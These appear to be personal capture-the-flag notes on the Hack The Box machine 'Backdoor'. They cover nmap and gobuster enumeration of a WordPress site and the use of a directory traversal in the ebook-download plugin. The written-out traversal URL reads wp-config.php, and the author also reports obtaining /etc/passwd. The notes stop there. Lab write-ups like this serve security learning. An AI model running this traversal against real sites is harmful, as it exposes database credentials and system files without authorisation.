IP= 10.129.204.81

First we run our nmap scan to see what ports are open 
# nmap 
![[Pasted image 20211202124453.png]]
running 
nmap -p- -vvv $IP -oA nmap/nmap    
to get all open ports and then we can run 
nmap -sC -sV -p 80,22,1337 -vvv $IP -oA nmap/nmap.detail

![[Pasted image 20211202124655.png]]

# Searching for port 1337 
after searching for a while i didn't find a lot so we ran gobuster and wpscan to see if we can find anything

# gobuster 
gobuster dir -u backdoor.htb -w ~/Desktop/Tools/SecLists/Discovery/Web-Content/raft-medium-words.txt -x php,txt                                                                                     


![[Pasted image 20211202133040.png]]


/wp-admin             (Status: 301) [Size: 315] [--> http://backdoor.htb/wp-admin/]                                                                                                                                
/wp-includes          (Status: 301) [Size: 318] [--> http://backdoor.htb/wp-includes/]                                                                                                                             
/index.php            (Status: 301) [Size: 0] [--> http://backdoor.htb/]                                                                                                                                           
/wp-content           (Status: 301) [Size: 317] [--> http://backdoor.htb/wp-content/]        

trying to access wp-includes we are in but we didn't find much
running gobuster again on wp-includes

gobuster dir -u backdoor.htb/wp-includes/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -z                     didn't get much either

running gobuster again on wp-content

gobuster dir -u backdoor.htb/wp-content/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt -z        
![[Pasted image 20211202133224.png]]
checking them one by one we found in 
/plugins
![[Pasted image 20211202133253.png]]
![[Pasted image 20211202133304.png]]
![[Pasted image 20211202133355.png]]
there is a plugin called ebook
looking on searchsploit
![[Pasted image 20211202133432.png]]

let's try first one Directory Traversal

searchsploit -x php/webapps/39575.txt

/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php

![[Pasted image 20211202133535.png]]

and now we have wordpress config file

we got /etc/passwd
![[Pasted image 20211202133847.png]]

